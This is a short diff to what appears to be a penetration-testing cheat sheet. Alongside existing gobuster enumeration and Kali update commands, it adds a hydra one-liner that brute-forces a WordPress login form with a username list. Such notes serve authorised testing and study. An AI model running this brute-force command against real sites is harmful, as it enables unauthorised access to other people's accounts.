@@ -22,6 +22,10 @@ Enumerate for directories
 WORDLISTS=
 gobuster dir -u HTTP://${IP_ADDR} -w ${WORDLISTS} -t 100 -q -o gobuster.txt
 ```
+Bruteforce with hydra
+```bash
+hydra -L example.txt -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+```
 ### How to update kali linux
 ```bash
 wget http://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2024.1_all.deb
